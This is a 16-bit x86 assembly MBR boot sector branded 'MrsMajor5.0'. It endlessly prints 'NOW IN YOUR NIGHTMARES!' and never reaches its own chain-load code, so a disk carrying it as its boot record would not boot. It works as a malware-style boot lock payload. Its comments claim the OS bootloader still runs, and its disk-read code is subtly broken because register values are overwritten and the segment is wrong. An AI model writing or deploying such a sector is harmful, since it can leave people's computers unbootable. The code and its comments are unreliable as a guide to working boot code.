BITS 16
ORG 0x7C00

start:
    ; Boot drive is set to the first hard disk
    mov dl, 0x80            ; Set boot drive to the first hard disk (0x80)

    ; Display "MrsMajor5.0 NOW IN YOUR NIGHTMARES!" message with effects
    mov ah, 0x0E            ; Teletype output function (int 10h)

    ; Loop to create visual effects
effect_loop:
    ; Display "MrsMajor5.0" with changing colors
    mov al, 'M'
    mov bl, 0x0C            ; Red color
    int 0x10
    mov al, 'r'
    int 0x10
    mov al, 's'
    int 0x10
    mov al, 'M'
    int 0x10
    mov al, 'a'
    int 0x10
    mov al, 'j'
    int 0x10
    mov al, 'o'
    int 0x10
    mov al, 'r'
    int 0x10
    mov al, '5'
    int 0x10
    mov al, '.'
    int 0x10
    mov al, '0'
    int 0x10

    ; Brief delay to simulate effect
    call short_delay

    ; Change color and display "NOW IN YOUR NIGHTMARES!"
    mov bl, 0x1F            ; White on blue color
    mov al, 'N'
    int 0x10
    mov al, 'O'
    int 0x10
    mov al, 'W'
    int 0x10
    mov al, ' '
    int 0x10
    mov al, 'I'
    int 0x10
    mov al, 'N'
    int 0x10
    mov al, ' '
    int 0x10
    mov al, 'Y'
    int 0x10
    mov al, 'O'
    int 0x10
    mov al, 'U'
    int 0x10
    mov al, 'R'
    int 0x10
    mov al, ' '
    int 0x10
    mov al, 'N'
    int 0x10
    mov al, 'I'
    int 0x10
    mov al, 'G'
    int 0x10
    mov al, 'H'
    int 0x10
    mov al, 'T'
    int 0x10
    mov al, 'M'
    int 0x10
    mov al, 'A'
    int 0x10
    mov al, 'R'
    int 0x10
    mov al, 'E'
    int 0x10
    mov al, 'S'
    int 0x10
    mov al, '!'
    int 0x10

    ; Brief delay to simulate effect
    call short_delay

    ; Repeat effects
    jmp effect_loop

short_delay:
    ; Simple delay loop for simulating effects
    mov cx, 0xFFFF
delay_loop:
    dec cx
    jnz delay_loop
    ret

    ; Chain-load the OS bootloader from the first partition
    mov dl, 0x80            ; Set the boot drive to the first hard disk
    mov ah, 0x02            ; BIOS disk read function
    mov al, 1               ; Read 1 sector
    mov ch, 0               ; Cylinder 0
    mov cl, 2               ; Sector 2 (active partition bootloader)
    mov dh, 0               ; Head 0
    mov ax, 0x7E00          ; Set AX to the segment where the bootloader will be loaded
    mov es, ax              ; Move AX into ES
    int 0x13                ; BIOS interrupt to read sector
    jc boot_fail            ; Jump to failure if disk read fails

    jmp 0x7E00:0x0000       ; Jump to the loaded boot sector (OS bootloader)

boot_fail:
    ; If the bootloader read fails, show an error message
    mov al, 'B'
    int 0x10
    mov al, 'o'
    int 0x10
    mov al, 'o'
    int 0x10
    mov al, 't'
    int 0x10
    mov al, ' '
    int 0x10
    mov al, 'f'
    int 0x10
    mov al, 'a'
    int 0x10
    mov al, 'i'
    int 0x10
    mov al, 'l'
    int 0x10
    mov al, 'e'
    int 0x10
    mov al, 'd'
    int 0x10
    jmp $

times 510-($-$$) db 0       ; Fill the remaining space up to 510 bytes
dw 0xAA55                   ; MBR signature (boot indicator)
